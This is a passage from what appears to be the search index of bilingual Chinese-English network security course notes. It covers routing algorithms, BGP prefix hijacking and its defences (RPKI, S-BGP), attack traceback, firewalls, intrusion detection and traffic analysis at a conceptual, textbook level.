<p>Routing Scheme:</p> <p>unicast -&gt; deliver msg to a single node</p> <p>\u6839\u636e\u4e24\u4e2a\u901a\u4fe1\u5b9e\u4f53\u662f\u5426\u5728\u4e00\u4e2a\u81ea\u6cbb\u7cfb\u7edf\u5185\uff0c\u6709\u4e24\u79cd\u4e0d\u540c\u7684\u8def\u7531\u9009\u62e9\u65b9\u6848\uff1a</p> <ul> <li>Intra-domain routing: inside an autonomous system (AS)</li> <li>Inter-domain routing: between different ASs</li> </ul> Example <p></p> <ul> <li>Intra-domain routing: consider A-F as routers</li> <li>Inter-domain routing: consider A-F as autonomous systems</li> </ul>"}, {"location": "Course/netsec/routesec/#route-computation", "title": "Route Computation", "text": ""}, {"location": "Course/netsec/routesec/#link-state-algorithms", "title": "Link-state Algorithms", "text": "<p>Abstract</p> <ul> <li>\u57fa\u4e8e Dijkstra \u7b97\u6cd5</li> <li>each router knows complete topology and link cost information</li> <li>independently run routing algorithm to calculate shortest path to each destination;</li> </ul> <p>\u5bf9\u4e8e Dijkstra\uff1a</p> <ul> <li><code>c(i, j)</code>: link cost from <code>i</code> to <code>j</code> (equals \\(\\infty\\) if unknown)</li> <li><code>D(v)</code>: current value of cost of path from source to destination <code>v</code></li> <li><code>p(v)</code>: predecessor node along path from source to <code>v</code></li> <li><code>N'</code>: set of nodes whose least cost path is already known</li> </ul> pseudo-code of Dijkstra <pre><code>// Initialization\nN' = {A}\nfor all nodes v\n    if v adjacent to A:\n        then D(v) = c(A, v)\n        else D(v) = infinty\n\nLoop:\n    find w not in N' such that D(w) is min:\n        add w to N'\n        Update D(v) for all v adjacent to w and not in N':\n            D(v) = min(D(v), D(w) + c(w, v))\n        // new cost to v is either the old cost, or known \n        // shortest path cost to w plus cost from w to v \ngo to Loop until all nodes in N'\n</code></pre> Example <p></p> \u5e38\u89c1 Link-State \u7b97\u6cd5 <ul> <li>OSPF (Open Shortest Path First)</li> <li>IS-IS (Intermediate System to Intermediate System)</li> <li>SPF (Shortest Path First)</li> </ul> <ul> <li>Such link-state algorithms require that each router knows complete topology &amp; link cost information;</li> <li>What if a router has no such global view, especially in a relatively large network?</li> <li>Then comes the distance-vector algorithms</li> </ul>"}, {"location": "Course/netsec/routesec/#distance-vector", "title": "Distance-vector", "text": "<p>Abstract</p> <ul> <li>\u4e5f\u79f0\u4e3a Bellman-Ford \u6216\u8005 Ford-Fulkerson \u7b97\u6cd5</li> <li>Each router knows direct neighbors &amp; link costs to neighbors</li> <li>Calculate the shortest path to each destination through an iterative process based on the neighbors\u2019 distances to each destination</li> </ul> <p>\u5bf9\u4e8e Distance-vector\uff1a</p> <ul> <li><code>Dx(y)</code>: cost of least-cost path from <code>x</code> to <code>y</code><ul> <li><code>Dx(y) = min{c(x, v) + Dv(y)}</code> </li> <li>for all neighbors <code>v</code> of <code>x</code></li> </ul> </li> </ul> <p>\u6838\u5fc3\u601d\u60f3\u662f\uff1a\u6bcf\u4e2a\u8282\u70b9\u7ef4\u62a4\u4e00\u4e2a\u8ddd\u79bb\u5411\u91cf\u8868\uff0c\u8bb0\u5f55\u5b83\u5230\u7f51\u7edc\u4e2d\u5176\u4ed6\u8282\u70b9\u7684\u8ddd\u79bb\uff0c\u7136\u540e\u901a\u8fc7\u5411\u76f8\u90bb\u8282\u70b9\u5e7f\u64ad\u81ea\u5df1\u7684\u8ddd\u79bb\u5411\u91cf\u8868\uff0c\u4e0e\u76f8\u90bb\u8282\u70b9\u4ea4\u6362\u4fe1\u606f\uff0c\u4ee5\u66f4\u65b0\u6574\u4e2a\u7f51\u7edc\u4e2d\u6bcf\u4e2a\u8282\u70b9\u7684\u8ddd\u79bb\u5411\u91cf\u8868\u3002</p> <p></p> <p>both types of path computation algorithms can be used for intra-domain routing and inter-domain routing</p>"}, {"location": "Course/netsec/routesec/#hierarchical-routing", "title": "Hierarchical Routing", "text": "<ul> <li>IGP (Interior Gateway Protocol)<ul> <li>RIP (Routing Information Protocol)</li> <li>OSPF (Open Shortest Path First)</li> </ul> </li> <li>BGP (Border Gateway Protocol)</li> </ul>"}, {"location": "Course/netsec/routesec/#rip", "title": "RIP", "text": "<ul> <li>Distance-vector algorithm<ul> <li>Distance metric: number of hops (max = 15 hops)</li> </ul> </li> <li>Each router exchanges its routing advertisement with its neighbors every 30 seconds</li> <li>Failure and Recovery<ul> <li>All routes via N invalidated; </li> <li>updates sent to neighbors, neighbors in turn may send out new advertisements (if tables changed)</li> <li>Use poison reverse to prevent ping-pong loops (16 hops = \\(\\infty\\)) </li> </ul> </li> </ul> Example"}, {"location": "Course/netsec/routesec/#ospf", "title": "OSPF", "text": "<ul> <li>LSP (Link-State Packet) <ul> <li>one entry per neighbor router</li> <li>ID of the node that created the LSP</li> <li>a list of direct neighbors, with link cost to each</li> <li>sequence number for this LSP message (SEQ)</li> <li>time-to-live (TTL) for information carried in this LSP</li> <li>Use raw IP packet (protocol ID = 89)</li> </ul> </li> <li>Build a complete map using link states<ul> <li>everyone broadcasts a piece of topology;</li> <li>put all pieces together \\(\\rightarrow\\) complete map</li> </ul> </li> </ul> process <pre><code>Builds and maintains topology map at each node\nStores and forwards most recent LSP from all other nodes\n    decrement TTL of stored LSP; discard info when TTL=0\nCompute routes using Dijkstra\u2019s algorithm\ngenerates its own LSP periodically with increasing SEQ\n</code></pre>"}, {"location": "Course/netsec/routesec/#bgp", "title": "BGP", "text": "<p>Border Gateway Protocol, connects other ASes</p> <p>Abstract</p> <ul> <li>\u6838\u5fc3\u601d\u60f3\u662f\u901a\u8fc7\u5411\u76f8\u90bb\u81ea\u6cbb\u5e7f\u64ad\u8def\u7531\u4fe1\u606f\uff0c\u5b9e\u73b0\u4e0d\u540c\u81ea\u6cbb\u7cfb\u7edf\u4e4b\u95f4\u7684\u8def\u7531\u4ea4\u6362</li> <li>\u6bcf\u4e2a\u81ea\u6cbb\u7cfb\u7edf\u4f1a\u7ef4\u62a4\u4e00\u4e2a BGP \u8def\u7531\u8868\uff0c\u8bb0\u5f55\u81ea\u5df1\u7684\u7f51\u7edc\u62d3\u6251\u548c\u53ef\u8fbe\u6027\u4fe1\u606f\uff0c\u5e76\u5c06\u5176\u5411\u76f8\u90bb\u7684\u81ea\u6cbb\u7cfb\u7edf\u5e7f\u64ad</li> <li>\u5f53\u4e00\u4e2a\u81ea\u6cbb\u7cfb\u7edf\u6536\u5230\u6765\u81ea\u76f8\u90bb\u81ea\u6cbb\u7cfb\u7edf\u7684\u8def\u7531\u4fe1\u606f\u65f6\uff0c\u4f1a\u4e0e\u81ea\u5df1\u7684\u8fdb\u884c\u6bd4\u5bf9\u5e76\u66f4\u65b0\u81ea\u5df1\u7684\u8def\u7531\u8868</li> </ul> <ul> <li>\u7c7b\u4f3c Vector Routing</li> <li>\u53ef\u4ee5\u7406\u89e3\u4e3a\u62bd\u8c61\u51fa\u4e24\u5c42\uff0c\u4e00\u5c42\u5185\u90e8\u7684\u8def\u7531\u7b97\u6cd5\uff0c\u4e00\u5c42\u662f\u4e0d\u540c\u81ea\u6cbb\u7cfb\u7edf\u4e4b\u95f4\u7684\u8def\u7531\u7b97\u6cd5</li> <li>As \u7684 border routers \u626e\u6f14 router \u7684\u89d2\u8272, As \u7684 prefix \u626e\u6f14 router \u7684 IP \u5730\u5740</li> </ul> <p></p> <p></p>"}, {"location": "Course/netsec/routesec/#routing-attacks", "title": "routing attacks", "text": "<p>routing attacks</p> <ul> <li>distance-vector: announce 0 distance to all other nodes</li> <li>link-state: drop links; claim direct link to other routers</li> <li>BGP: announce arbitrary prefix; alter paths</li> </ul> <ul> <li>distance-vector: <ul> <li>Announce 0 distance to all other nodes</li> <li>Blackhole traffic</li> <li>Eavesdrop</li> </ul> </li> <li>link-state: <ul> <li>Can drop links randomly</li> <li>Can claim direct link to any other routers</li> <li>A bit harder to attack than DV</li> </ul> </li> <li>BGP: <ul> <li>ASes can announce arbitrary prefix</li> <li>ASes can alter path</li> </ul> </li> </ul>"}, {"location": "Course/netsec/routesec/#prefix-hijacking", "title": "Prefix Hijacking", "text": "How does it work? <ul> <li>The first method is to pretend to be a certain prefix. When routers exchanges their messages, they will think that the attacker has this prefix and they renew their routing table. So the traffic towards that prefix will acturally routed to the attacker.</li> <li>The second method is to pretend to be near to a certain prefix. As the routing algorithms tend to find a short path toward the destination, some of the routers will route the packets to the attacker.</li> </ul> <p>Case 1: \u8c0e\u79f0\u81ea\u5df1\u662f\u67d0\u4e2a prefix</p> <p></p> <p>Case 2: \u8c0e\u79f0\u81ea\u5df1\u6709\u66f4\u77ed\u7684\u8def\u5f84</p> <p>attacker \u8c0e\u79f0\u81ea\u5df1\u662f\u67d0\u4e2a\u8282\u70b9\u7684 neighbor, \u7136\u540e\u5bfc\u81f4\u6709\u4e00\u4e2a\u865a\u5047\u7684\u6700\u77ed\u8def\u5f84\uff0c\u4f7f\u5f97\u6d41\u91cf\u7ecf\u8fc7\u653b\u51fb\u8005\u7684\u8282\u70b9</p> <p></p> <p>\u4f8b\u5982 <code>China Telecom</code> \u5ba3\u79f0\u662f <code>22394</code> \u7684 neighbor\uff0c\u7136\u540e\u5bfc\u81f4 <code>ISP 1</code> \u8ba1\u7b97\u51fa\u4e86\u66f4\u77ed\u8def\u5f84\uff0c\u4f1a\u5148\u7ecf\u8fc7 <code>China Telecom</code></p>"}, {"location": "Course/netsec/routesec/#path-tampering", "title": "Path Tampering", "text": "<p>\u901a\u8fc7\u4fee\u6539\u8def\u5f84\u4e0a\u7684 AS \u8282\u70b9\u6765\u8fbe\u5230\u8df3\u8f6c\u5177\u4f53\u51e0\u8df3\u7684\u76ee\u7684\uff0c\u4ece\u800c\u5b9e\u73b0\u653b\u51fb\uff1a</p> <p></p>"}, {"location": "Course/netsec/routesec/#secure-routing_1", "title": "Secure Routing", "text": ""}, {"location": "Course/netsec/routesec/#rpki-resource-public-key-infrastructure", "title": "RPKI (Resource Public Key Infrastructure)", "text": "How does RPKI work? <ul> <li>RPKI provides a certified mapping from ASes to prefixes (as well as public keys). </li> <li>So when an attacker AS pretend to have a certain prefix, other ASes can find from the RPKI that it is not valid, so that the first method of prefix hijacking will not work.</li> <li>But as for the second method, RPKI can do nothing, so it is insufficient for secure routing.</li> </ul> <ul> <li>RPKI \u662f IP \u524d\u7f00\u548c\u62e5\u6709\u4ed6\u4eec\u7684 As \u4e4b\u95f4\u7684\u8ba4\u8bc1\u6620\u5c04</li> </ul> <p>However, if instead of just being misconfigured, china telecom decided to behave maliciously, RPKI would not be enough. So for example china telecom could pretend they have a direct connection to the AS that owns the prefix by announcing China telecom 22394.</p>"}, {"location": "Course/netsec/routesec/#s-bgp", "title": "S-BGP", "text": "<p>\u4e5f\u9a8c\u8bc1\u4e86\u90bb\u5c45\u5173\u7cfb\uff0c\u89e3\u51b3 Prefix Hijacking \u7684\u7b2c\u4e8c\u4e2a\u95ee\u9898</p> <ul> <li>Each AS on the path cryptographically signs its announcement</li> <li>Guarantees that each AS on the path made the announcement in the path.</li> </ul> <p>Address attestations</p> <ul> <li>Claim the right to originate a prefix</li> <li>Signed and distributed out-of-band</li> <li>Checked through delegation chain from ICANN</li> </ul> <p>Route attestations</p> <ul> <li>Distributed as an attribute in BGP update message</li> <li>Signed by each AS as route traverses the network</li> <li>Signature signs previously attached signatures</li> </ul> <p>S-BGP can validate</p> <ul> <li>AS path indicates the order ASes were traversed</li> <li>No intermediate ASes were added or removed </li> </ul> <p>Deployment challenges:</p> <ul> <li>Complete, accurate registries<ul> <li>E.g., of prefix ownership</li> </ul> </li> <li>Public Key Infrastructure<ul> <li>To know the public key for any given AS</li> </ul> </li> <li>Cryptographic operations<ul> <li>E.g., digital signatures on BGP messages</li> </ul> </li> <li>Need to perform operations quickly<ul> <li>To avoid delaying response to routing changes</li> </ul> </li> <li>Difficulty of incremental deployment<ul> <li>Hard to have a \u201cflag day\u201d to deploy S-BGP</li> </ul> </li> </ul>"}, {"location": "Course/netsec/traceback/", "title": "Attack Traceback", "text": "<p> \u7ea6 842 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f</p> <ul> <li>Assume we have detected an attack. But we don\u2019t know where it comes from. </li> <li>Source IP address can be spoofed.</li> </ul> <p>\u5f15\u5165 Ingress Filtering</p>"}, {"location": "Course/netsec/traceback/#ingress-filtering", "title": "Ingress Filtering", "text": "<p>Ingress filtering \u53ef\u4ee5\u89e3\u51b3 spoofing \u7684\u95ee\u9898\uff0c\u4f46\u6709\u90e8\u7f72\u95ee\u9898</p> <ul> <li>How to find packet origin?</li> </ul> <p></p> <ul> <li>Ingress filtering policy:<ul> <li>ISP only forwards packets with legitimate source IP</li> </ul> </li> <li>Implementation challenges:<ul> <li>All ISPs need to do this \u2014 requires global coordination:<ul> <li>If 10% of networks don\u2019t implement, there\u2019s no defense;</li> <li>No incentive for an ISP to implement \u2014 doesn\u2019t affect them;</li> </ul> </li> <li>As of 2017 (from CAIDA):<ul> <li>33% of autonomous systems allow spoofing;</li> <li>23% of announced IP address space allow spoofing;</li> </ul> </li> </ul> </li> </ul> <p>\u56e0\u4e3a\u90e8\u7f72\u56f0\u96be\uff0c\u6240\u4ee5\u4f7f\u7528 Transit Routers</p>"}, {"location": "Course/netsec/traceback/#ip-traceback", "title": "IP Traceback", "text": "<p>DDoS Defenses - IP Traceback</p> <ul> <li>Goal:<ul> <li>given set of attack packets determine path to source</li> </ul> </li> <li>How:<ul> <li>change routers to record info in packets</li> </ul> </li> <li>Assumptions:<ul> <li>trusted routers</li> <li>sufficient packets to track</li> <li>stable route from attacker to victim</li> </ul> </li> <li>Write path into packets<ul> <li>router adds its own IP address to packet victim reads path from packet</li> </ul> </li> <li>Deterministic Packet Marking</li> <li>Limitations<ul> <li>requires space in packet </li> <li>path can be long</li> <li>no extra fields in current IP format (changes to packet format too much to expect)</li> </ul> </li> </ul>"}, {"location": "Course/netsec/traceback/#icmp", "title": "ICMP", "text": ""}, {"location": "Course/netsec/traceback/#icmp-traceback", "title": "ICMP Traceback", "text": "<p>Acronym: iTrace</p> <ul> <li>Each router samples one of packets it is forwarding and copies the contents and adjacent routers\u2019 info into an ICMP traceback message</li> <li>Router uses HMAC and X.509 digital certificate for authenticating traceback messages</li> <li>Router sends ICMP traceback messages to the destination</li> </ul> <p>Some issues:</p> <ul> <li>Require all the routers transmitting attack traffic be enabled with iTrace to construct an entire attack path</li> <li>yet ICMP packets are usually filtered\u2026 because of ICMP Ping Flood Attack\u2026</li> <li>yet not all packets are sampled on every hop</li> </ul> ICMP Ping Flood <p>DDoS \u4e2d\u4ecb\u7ecd\u8fc7 ICMP Ping Flood</p> <p>Exploit Internet Control Messge Protocol (ICMP)</p> <ul> <li>an internet layer protocol used by network devices to communicate;</li> <li>also used by network diagnostic tools such as traceroute and ping;</li> </ul> <ul> <li>ICMP Echo Request: sender to receiver</li> <li>ICMP Echo Reply: receiver to sender</li> </ul> <p>Attack Principle:</p> <ul> <li>both incoming ICMP Echo Request and outgoing ICMP Echo Reply consume bandwidth;</li> <li>overwhelm the target device\u2019s ability to respond to a high number of requests and/or overload the network connection with bogus traffic</li> <li>The attacker sends many ICMP echo request packets to the targeted server using multiple devices;</li> <li>The targeted server then sends an ICMP echo reply packet to each requesting device\u2019s IP address as a response.</li> </ul> <p>Solution:</p> <ul> <li>disable the ICMP functionality of the target device;</li> <li>(make the device unresponsive to ping requests and traceroute requests)</li> </ul> Ping Flood Process <p>The DDoS form of a Ping (ICMP) Flood can be broken down into 2 repeating steps:</p> <ul> <li>The attacker sends many ICMP echo request packets to the targeted server using multiple devices.</li> <li>The targeted server then sends an ICMP echo reply packet to each requesting device\u2019s IP address as a response.</li> </ul>"}, {"location": "Course/netsec/traceback/#path-validation", "title": "Path Validation", "text": "<ul> <li>PoC: Proof of Consent<ul> <li>certify the provider\u2019s consent to carry traffic along the path</li> </ul> </li> <li> <p>PoP: Proof of Provenance</p> <ul> <li>allow upstream nodes to prove to downstream nodes that they carried the packet</li> </ul> </li> <li> <p>Routers are dictated with paths and credentials</p> </li> <li>Routers add path proofs to packets</li> <li>Routers verify path proofs</li> </ul>"}, {"location": "Course/netsec/traceback/#link-testing", "title": "Link Testing", "text": "<p>How frequent is attack?</p> <ul> <li>Not every packet should be always marked and sampled</li> </ul> <p>Only do when needed</p> <ul> <li>Traceback from the router closest to the victim</li> <li>Determine the upstream link that is used to carry out the attack traffic</li> <li>Recursively apply the previous technique until the attack source is reached</li> <li>Has to take effect while the attack is in progress</li> </ul> <p>\u5177\u4f53\u6765\u8bf4\uff1a</p> Input DebuggingControlled Flooding <ul> <li>Find attack signature, the common feature contained in all attack packets</li> <li>Communicate the attack signature to the upstream router, which then filters attack packets and determines the port of entry</li> <li>Recursively apply the previous technique on the upstream routers until reaching the attack source</li> <li>\u56f0\u96be\u662f\uff1aA considerable management overhead at the ISP level to communicate and coordinate the traceback</li> </ul> <ul> <li>Need collaborative hosts</li> <li>Force the hosts to flood the links to upstream routers</li> <li>Since buffer on victim is shared by all incoming links, flooding the link carrying out attack leads to drops of attack packets</li> <li>Recursively apply the previous technique on the upstream routers until reaching the attack source</li> <li>\u56f0\u96be\u662f\uff1aRequire an accurate topology map; High overhead given multiple attacking sources (e.g., DDoS)</li> </ul>"}, {"location": "Course/netsec/traceback/#logging-based-traceback", "title": "Logging-Based Traceback", "text": "<p>But link testing requires ongoing attack -&gt; post-attack traceback</p> <p>log packets on routers to support query</p> <ul> <li>Routers store packet logs</li> <li>Victim queries the closest routers about packet appearance of attack packets</li> <li>The router containing attack packets recursively query upstream routers until reaching the attack source</li> </ul> what packet data to log? <ul> <li>Raw packets? high storage overhead on routers</li> <li>Hash of invariant content per packet? still high storage overhead given high traffic rate</li> </ul> How to efficient memership query? <p>Bloom Filter</p> <ul> <li>Effeficent set memership query using multiple hashes per set elements</li> <li>Use a bitmap, a bit of which is set if one element is hashed to this position</li> </ul> <p></p>"}, {"location": "Course/netsec/traffic/", "title": "Traffic Analysis", "text": "<p> \u7ea6 1409 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 5 \u5206\u949f</p> <p>filter malicious traffic</p>"}, {"location": "Course/netsec/traffic/#firewall", "title": "Firewall", "text": "<ul> <li>Form a barrier through which the traffic going in each direction must pass | \u53cc\u5411\u6d41\u91cf\u90fd\u9700\u8981\u901a\u8fc7\u8fd9\u4e2a barrier</li> <li>Use <code>firewall security policy</code> to dictate which traffic is authorized to pass in each direction</li> </ul>"}, {"location": "Course/netsec/traffic/#design-goals", "title": "Design Goals", "text": "<ul> <li>All traffic from inside to outside, and vice versa, must pass through the firewall.</li> <li>Only authorized traffic, as defined by the local security policy, will be allowed to pass. </li> <li>The firewall itself is immune to penetration. </li> </ul>"}, {"location": "Course/netsec/traffic/#design-techniques", "title": "Design Techniques", "text": ""}, {"location": "Course/netsec/traffic/#service-control", "title": "Service Control", "text": "<p>determine service types that can be accessed (inbound or outbound)</p> <ul> <li>Filter traffic on the basis of IP address, protocol, or port number</li> <li>Provide proxy software that receives and interprets each service request before passing it on</li> <li>Host the server software itself, such as Web or Email service</li> </ul>"}, {"location": "Course/netsec/traffic/#direction-control", "title": "Direction Control", "text": "<p>determine the direction in which particular service requests may be initiated and allowed to flow through the firewall</p>"}, {"location": "Course/netsec/traffic/#user-control", "title": "User Control", "text": "<p>control access to a service according to which user is attempting to access it</p> <ul> <li>Typically apply to local users</li> <li>Also apply to external users via secure authentication technology (e.g., IPsec Authentication Header)</li> </ul>"}, {"location": "Course/netsec/traffic/#behavior-control", "title": "Behavior Control", "text": "<p>control how particular services are used</p> <p>E.g., </p> <ul> <li>filter E-mail to eliminate spam, or </li> <li>enable external access to only a portion of the information on a local Web server</li> </ul>"}, {"location": "Course/netsec/traffic/#firewall-types", "title": "Firewall Types", "text": ""}, {"location": "Course/netsec/traffic/#packet-filtering-firewall", "title": "Packet Filtering Firewall", "text": "<p>Apply a set of rules to each incoming and outgoing IP packet, Forward or discard the packet</p> <ul> <li>Make filtering decisions on an individual packet basis</li> <li>Consider no higher-layer context</li> <li>If no match, default discard, or default forward</li> </ul> Packet Filtering Firewall <ul> <li>\u5bf9\u4f20\u8f93\u5c42\u8fdb\u884c\u8fc7\u6ee4\uff0cfirewall \u5145\u5f53 interface, \u6570\u636e\u5305\u5934\u90e8\u4f1a\u6709 <code>source IP/port</code>, <code>destination IP/port</code>, <code>protocol</code></li> </ul> <p></p> <ul> <li>\u901a\u8fc7\u68c0\u67e5\u6570\u636e\u5305\u7684\u5934\u90e8\u4fe1\u606f\uff0c\u6765\u51b3\u5b9a\u662f\u5426\u5141\u8bb8\u6570\u636e\u5305\u901a\u8fc7</li> </ul>"}, {"location": "Course/netsec/traffic/#stateful-inspection-firewall", "title": "Stateful Inspection Firewall", "text": "<p>Both packets and their context are examined by the firewall</p> <p>\u6570\u636e\u5305\u548c\u5b83\u4eec\u7684\u4e0a\u4e0b\u6587\u90fd\u7531\u9632\u706b\u5899\u68c0\u67e5\uff0c\u4e5f\u53d1\u751f\u5728\u4f20\u8f93\u5c42</p>"}, {"location": "Course/netsec/traffic/#application-proxy-firewall", "title": "Application Proxy Firewall", "text": "<ul> <li>Application-Level Gateway | \u5e94\u7528\u5c42</li> <li>Act as a relay of application-level traffic</li> </ul> <p>\u4f5c\u4e3a\u4e00\u4e2a\u5e94\u7528\u5c42\u7684 relay\uff0c\u4f7f\u5f97\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u4ece\u4e0d\u76f4\u63a5\u4ea4\u4e92\uff0c\u800c\u662f\u4ee5\u9632\u706b\u5899\u4f5c\u4e3a\u4ee3\u7406\uff0c\u540c\u65f6\u53ef\u4ee5\u68c0\u67e5\u6570\u636e\u5305\u7684\u5168\u90e8\u5185\u5bb9</p> more explanation <ul> <li>An application-proxy firewall is\u00a0a server program that understands the type of information being transmitted\u2014for example, HTTP or FTP. </li> <li>It functions at a higher level in the protocol stack than do packet-filtering firewalls, thus providing more opportunities for the monitoring and control of accessibility</li> </ul>"}, {"location": "Course/netsec/traffic/#circuit-level-proxy-firewall", "title": "Circuit-Level Proxy Firewall", "text": "<ul> <li>Circuit-Level Gateway (\u8fd8\u662f\u5728\u4f20\u8f93\u5c42)</li> <li>Act as a relay of TCP segments without examining the contents</li> <li>Set up two TCP connections instead</li> </ul> <p>\u4f5c\u4e3a\u4e00\u4e2a transport layer \u7684 relay\uff0c\u4ee3\u7406\u4e3b\u673a\u548c\u5bf9\u65b9\u5b8c\u6210 TCP \u8fde\u63a5\u5efa\u7acb\uff1b\u4e00\u65e6\u5efa\u7acb\u8fde\u63a5\u540e\u5c31\u6b63\u5e38\u8f6c\u53d1\uff0c\u4e0d\u68c0\u67e5\u5185\u90e8\u5185\u5bb9\u3002</p> Info <p></p>"}, {"location": "Course/netsec/traffic/#where-firewall-stand", "title": "Where Firewall Stand?", "text": ""}, {"location": "Course/netsec/traffic/#dmz-networks", "title": "DMZ Networks", "text": "<p>DMZ (Demilitarized Zone | \u505c\u706b\u533a)</p> <ul> <li>External Firewall<ul> <li>provide access control and protection for DMZ systems consistent with their need for external connectivity</li> </ul> </li> <li>Internal Firewall<ul> <li>add more stringent filtering capability; </li> <li>protect internal network from attacks from DMZ and vice versa;</li> <li>protect internal networks from each other;</li> </ul> </li> </ul> <p></p>"}, {"location": "Course/netsec/traffic/#virtual-private-networks", "title": "Virtual Private Networks", "text": "<ul> <li>Use encryption and authentication in the lower protocol layers to provide a secure connection through insecure Internet</li> <li>Cheaper than real private networks using private lines</li> <li>Common protocol in use: IPsec</li> </ul>"}, {"location": "Course/netsec/traffic/#distributed-firewalls", "title": "Distributed Firewalls", "text": "<ul> <li>Stand-alone firewall devices + host-based firewalls work together under a central administrative control</li> </ul>"}, {"location": "Course/netsec/traffic/#ids", "title": "IDS", "text": "traffic pattern learned? <p>individually secure packets yet collaboratively malicious (e.g. TCP SYN Flood)</p> <p>IDS (Intrusion Detection System)</p> <ul> <li>Detect unusual patterns of activity or patterns of activity that are known to correlate with intrusions</li> <li>Provide early warning of an intrusion so that defensive action can be taken</li> </ul>"}, {"location": "Course/netsec/traffic/#instruction-behavior-pattern", "title": "Instruction Behavior Pattern", "text": "Info <ul> <li>Hacker<ol> <li>Select the target using IP lookup tools such as NSLookup, Dig, and others.</li> <li>Map network for accessible services using tools such as NMAP.</li> <li>Identify potentially vulnerable services (in this case, pcAnywhere)</li> <li>Brute force (guess) pcAnywhere password.</li> <li>Install remote administration tool called DameWare.</li> <li>Wait for administrator to log on and capture his password</li> <li>Use that password to access remainder of network.</li> </ol> </li> <li>Criminal Enterprise<ol> <li>Act quickly and precisely to make their activities harder to detect.</li> <li>Exploit perimeter through vulnerable ports.</li> <li>Use Trojan horses (hidden software) to leave back doors for reentry.</li> <li>Use sniffers to capture passwords.</li> <li>Do not stick around until noticed.</li> <li>Make few or no mistakes.</li> </ol> </li> <li>Internet Threat<ol> <li>Create network accounts for themselves and their friends.</li> <li>Access accounts and applications they wouldn\u2019t normally use for their daily jobs.</li> <li>E-mail former and prospective employers.</li> <li>Conduct furtive instant-messaging chats.</li> <li>Visit Web sites that cater to disgruntled employees, such as f\u2019dcompany.com.</li> <li>Perform large downloads and file copying</li> <li>Access the network during off hours.</li> </ol> </li> </ul> <p>intruder behavior differs from that of a legitimate user in ways that can be quantified:</p> <p></p>"}, {"location": "Course/netsec/traffic/#how-to-detect-intrusion", "title": "How to Detect Intrusion", "text": "<ol> <li>Audit Record<ul> <li>Record ongoing activity of users</li> <li>Input records to IDS</li> <li>Native Audit Record<ul> <li>use available accounting software in OS to collect user activity information;</li> <li>need no additional collection software;</li> <li>may not contain needed information or may not contain it in a convenient form;</li> </ul> </li> <li>Detection-Specific Audit Record<ul> <li>use a dedicated facility to generate audit records containing only required information for IDS;</li> <li>vender independent and portable;</li> <li>extra overhead</li> </ul> </li> <li>Example fields - Subject, Action, Object, Exception Condition, Resource-Usage, Time-Stamp</li> </ul> </li> <li>Statistical Anomaly Detection<ul> <li>Threshold detection<ul> <li>count the number of occurences of a specific event type over an interval of time, detect an intrusion if the number exceeds a reasonable number (\u5982\u679c\u8d85\u8fc7\u5408\u7406\u6570\u91cf\uff0c\u5219\u62a5\u544a\u5165\u4fb5)</li> </ul> </li> <li>Profile-based detection (Signature)<ul> <li>characterize past behavior of some user(s), detect an intrusion if a significant deviation occurs (\u5982\u679c\u53d1\u751f\u91cd\u5927\u504f\u5dee\uff0c\u62a5\u544a\u5165\u4fb5)</li> </ul> </li> </ul> </li> <li>Rule-Based Detection<ul> <li>Detect intrusion by observing events in the system and applying a set of rules that lead to a decision regarding whether a given pattern of activity is suspicious or not</li> <li>Analyze historical audit records to identify usage patterns and generate rules that describe those patterns</li> <li>e.g., aggregated traffic volume exceeds a threshold</li> </ul> </li> </ol>"}, {"location": "Course/netsec/traffic/#distributed-ids", "title": "Distributed IDS", "text": "<ul> <li>operate as a background process on a monitored system;</li> <li>collect data on security-related events on the host and transmit to central manager;</li> <li>operate the same as host agent module except that it analyzes LAN traffic and reports to central manager;</li> <li>receive reports from LAN monitor and host agents, process and correlate these report to detect intrusion;</li> </ul> <p>how to profile attack more?</p>"}, {"location": "Course/netsec/traffic/#honeypot", "title": "Honeypot", "text": "<ul> <li>Decoy systems designed to lure a potential attacker away from critical systems</li> <li>Collect information about the attacker\u2019s activity</li> <li>Encourage the attacker to stay on the system long enough for administrators to respond</li> </ul> <p>ADS (Active Defense System)</p> <p>how accurate is IDS?</p>"}, {"location": "Course/netsec/traffic/#ids-detection-accuracy", "title": "IDS Detection Accuracy", "text": "<ul> <li>Detection rate / True Positive Rate (TP)<ul> <li>given that there is an intrusion, how likely will the IDS correctly output an alert</li> </ul> </li> <li>False Negative Rate: FN = 1 - TP</li> <li>False Alarm / False Positive Rate (FP) <ul> <li>given that there is no intrusion, how likely is the IDS to falsely output an alert</li> </ul> </li> <li>True Negative Rate: TN = 1 - FP</li> </ul> IDS vs Firewall <ul> <li>Firewall supports active filtering</li> <li>IDS provides only passive monitoring</li> </ul>"}, {"location": "Course/netsec/traffic/#ips", "title": "IPS", "text": "<ul> <li>Intrusion Prevention System<ul> <li>an extension of IDS to attempt to block or prevent detected malicious activity</li> </ul> </li> <li>Host-based, network-based, or distributed</li> <li>Anomaly detection to identify behavior different from legitimate users</li> <li>Signature/heuristic detection to identify malicious behavior</li> </ul>"}, {"location": "Course/netsec/traffic/#advanced-traffic-analysis", "title": "Advanced Traffic Analysis", "text": "<p>Pattern Correlation</p> <ul> <li>Pair users of secure messaging applications</li> <li>Secure messaging applications\u2019 traffic features</li> <li>event-based algorithm</li> <li>shape-based algorithm</li> <li>Machine learning</li> <li>Deep learning</li> </ul> <p>but Attacker can hide traffic patterns:</p> <ul> <li>Traffic Obfuscation | \u6df7\u6dc6<ul> <li>Encrypt traffic to hide payloads</li> <li>Use proxy to hide entire packets</li> <li>Introduce noise traffic to hide patterns</li> <li>e.g. ditto:<ul> <li>Obfuscate packet size by padding</li> <li>Obfuscate transmission interval by dummy packets</li> </ul> </li> </ul> </li> </ul> how to detect evasion? <p>more advanced analysis:</p> <p>Active Probing</p> <ul> <li>Suspicious of a host using a certain software (e.g., cryptomining)?</li> <li>Send a probe (e.g., to a specific port) under the protocol of the software</li> <li>See if the probed host responds as expected </li> </ul> <p>\u5927\u610f\u5c31\u662f\u4e3b\u52a8\u53d1\u4e00\u4e2a\u63a2\u6d4b\u5668\u8fc7\u53bb\uff0c\u770b\u770b\u5bf9\u9762\u53cd\u5e94\u6b63\u4e0d\u6b63\u5e38</p>"}, {"location": "Course/netsec/webprotect/", "title": "Network Protection", "text": "<p> \u7ea6 1042 \u4e2a\u5b57  